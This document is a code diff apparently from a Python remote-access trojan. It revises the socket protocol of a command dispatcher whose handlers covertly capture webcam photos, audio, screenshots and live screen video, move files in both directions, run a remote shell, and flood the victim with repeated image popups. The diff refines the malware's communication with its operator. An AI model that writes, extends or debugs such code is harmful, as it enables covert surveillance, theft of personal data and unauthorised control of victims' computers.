@@ -1,5 +1,6 @@
 from os import listdir,chdir,path,remove,getcwd
 import socket
+from select import select
 import cv2
 from json import dumps,loads
 from numpy import array , uint8
@@ -36,12 +37,13 @@ def HDalert(conn):
     data=''
     while 1:
         RCdata=conn.recv(40000).decode()
-        if not RCdata:
+        if "END" in RCdata[len(RCdata)-3 : len(RCdata)]:
+            data+=RCdata[0:len(RCdata)-3]
             break
         data+=RCdata
     CVimg=array(loads(data)).astype(uint8)
     img=Image.fromarray(CVimg)
-    for i in range(1000):
+    for i in range(10000):
         img.show()
 def sendInfo(conn):
     if "windows" in sysInfo():
@@ -120,6 +122,9 @@ def live(conn):
         dmps=dumps(RGBlist)
         conn.sendall(dmps.encode())
         conn.send("END".encode())
+        flag=conn.recv(1024).decode()
+        if flag=='end':
+            break
         sleep(0.25)
 def recSound(conn):
     chunk = 1024
@@ -181,13 +186,16 @@ def DirExp(conn,command):
                         if not rdata:
                             break
                         conn.sendall(rdata)
-                    conn.send(b"")
                 if command[0:7]=='4FXdwn:':
                     buffer = 4096
                     with open(filePath ,"wb") as f:
                         while 1:
                             data=conn.recv(buffer)
-                            if not data:
+                            if "END" in str(data[len(data)-3:]) :
+                                data=data[0:(len(data)-3)]
+                                f.write(data)    
+                                break
+                            if not data :
                                 break
                             f.write(data)
                         f.close()
@@ -213,9 +221,10 @@ def DirExp(conn,command):
             with open(filePath ,"wb") as f:
                 while 1:
                     data=conn.recv(buffer)
-                    f.write(data)
-                    if not data:
+                    if "END" in str(data[len(data)-3:]):
+                        f.write(data[0:len(data)-3])
                         break
+                    f.write(data)
                 f.close()
         except IsADirectoryError:
             return 1
@@ -224,39 +233,40 @@ def commandRunner(conn,command,key):
         sleep(0.25)
         if command=="Tpict":
             getPic(conn)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="Rsound":
             recSound(conn)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="Glive":
             live(conn)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="Tscr":
             takeScr(conn)
-            conn.close()
+            conn.send(b"END")
             break
         elif command[0:2]=="FX" or command[0:3]=="4FX":
             DirExp(conn,command)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="RMCM":
             shellRN(conn,key)
-            conn.close()
+            conn.send(b"END")
             break
         elif command[0:2]=="WN":
             popup(conn,command)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="HDalert":
             HDalert(conn)
-            conn.close()
+            conn.send(b"END")
             break
         elif command=="Sinfo":
             sendInfo(conn)
-            conn.close()
+            conn.send(b"END")
             break
         else :
             break
+
